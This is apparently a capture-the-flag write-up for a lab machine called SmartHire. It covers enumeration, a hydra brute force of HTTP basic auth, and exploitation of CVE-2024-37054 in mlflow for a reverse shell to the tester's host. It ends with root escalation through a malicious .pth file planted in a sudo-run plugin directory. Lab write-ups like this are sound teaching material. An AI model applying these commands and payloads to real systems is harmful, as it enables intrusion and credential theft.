# SmartHire

## Nmap scan:
```
Nmap scan report for 10.129.9.32
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Writeup:
An initial nmap TCP scan reveals two open ports, `80` and `22`.
I also run a UDP scan, but no open ports are found.
Checking on port `80` I come to a standard homepage, however I see a blue "sign in" button.
With this I discover both a `/login` endpoint and a `/register` endpoint.
Doing a quick directory enumeration scan with `gobuster` and the `big.txt` wordlist I discover the following endpoints:
```
dashboard            (Status: 302) [Size: 199] [--> /login]
login                (Status: 200) [Size: 6160]
logout               (Status: 302) [Size: 199] [--> /login]
predict              (Status: 302) [Size: 199] [--> /login]
register             (Status: 200) [Size: 6499]
```

For good measure I also run a subdomain enumeration scan with `ffuf`.
This discovers the following subdomain:
- `models.smarthire.htb`
A quick directory enumeration scan reveals a queryable `/health` endpoint.
All other endpoints on this subdomain require authentication to access, thus for now I will explore other avenues until I can find creds.

Continuing, I register an account with smarthire with the following information:
```
Username: Username
Company: Company
Password: Password123
```

After authentication I don't find anything interesting, just the ability to upload `.csv` files.
I decide then to try and bruteforce the `http` basic authentication using `hydra` on the `models.smarthire.htb` subdomain.
This results in a success with the username `admin` and the password `password`, could have guessed that.

Successful login leads to an `mlflow` management interface, with the version number `2.14.1`.
A bit of research reveals that this version of `mlflow` is vulnerable to `CVE-2024-37054`.
I find a PoC on github (see submodule) and by exploiting this I'm able to pop a reverse shell as the `svcweb` user.
I quickly check the environment variables, and find the following:
- `SMARTHIRE_SECRET_KEY=b9c53f2f4459ee6ed15f7f85c0549861`

In the home directory of the `svcweb` user I find the `user.txt`.
I then procede to pop my public key into the `.ssh/authorized_keys` file, which grants me legitimate access over `ssh`.

Looking around the `/var/www/smarthire.htb` directory, I find `smarthire.db`.
The `sqlite` command is not available, so I use `strings` to dump the data from the database.
This results in hashes :D

However, the format is messed up due to using strings, so instead I quickly host an `http` server from the victim machine, and download the `smarthire.db` database using wget.

```
scrypt:32768:8:1$76OuZ6CZ1iICwCHq$071148ff603f6fb8084f7ad5b87b58cd0dd0e9f4c59fd806be1ae1f4a1b87a3824dd6810b78f07ce9c8b42f4371d07d06a061f6a6f9c4edd0c352c71df3834c6
scrypt:32768:8:1$A9p7IhZdWA1PooFx$08706ab2920845e618eac4673440ea994e3446bb6fe3e3d0e991423c5bbeb5b0102b1e60661fb5aa10d2c14dc21e60425f8640c5abd7ca479b0008b81a95a633
```

I also notice a `basic_auth.db` in `/opt/mlflow/app`.
This also contains hashes for the `admin` user.
```
scrypt:32768:8:1$VTZzihuLOfXxQv4x$979e567ec0829592e844f316e2c034b53b32939a6cc9c013d4da8734ca5115b52b2ce76bb3a56fd739fdb430e6d763ed3009ac19e438f86216fc97754d178196
```

I also realise that `sudo -l` works, even without the password for `svcweb`.
This reveals that I can run the following script as root:
- `(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *`

The `mlflowctl.py` script has plugin functionality as seen here:
```
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

The `site.addsitedir(str(path))` functionality scans the plugin directories for `.pth` files which contain executable python code. For some reason, when found, these files are immediately interpreted and executed in the context of the current process (Thus root!).
It looks for these files in the following two directories, `/core` and `/dev`.
The first is not writeable by `svcweb`, but the `/dev` is. 
By placing a malicious `.pth` file in `/dev` we get arbitrary python code execution as root.
Thus I place the following code in `/opt/tools/mlflow_ctl/plugins/dev/auto_load.pth`
```
import os; os.system('cp /home/svcweb/.ssh/authorized_keys /root/.ssh/authorized_keys')
```

This copies the `authorized_keys` file from my pwned `svcweb` user into the `root` user's `.ssh` directory, thus allowing me to `ssh` into the machine as root.

As soon as I run:
- `sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status`

The malicious `.pth` file is executed, and I gain root access.
Waiting for me is the `root.txt` file within the `root` users home directory :D

## Commands Used:
- `ffuf -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://10.129.9.32' -H "Host:FUZZ.smarthire.htb" -fs 178`
- `hydra -l "admin" -P  ~/SecLists/Passwords/Leaked-Databases/rockyou.txt "http-get://models.smarthire.htb/"`
- `python3 shell.py --lhost 10.10.15.217 --lport 4444 --atoz`
- `sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status`
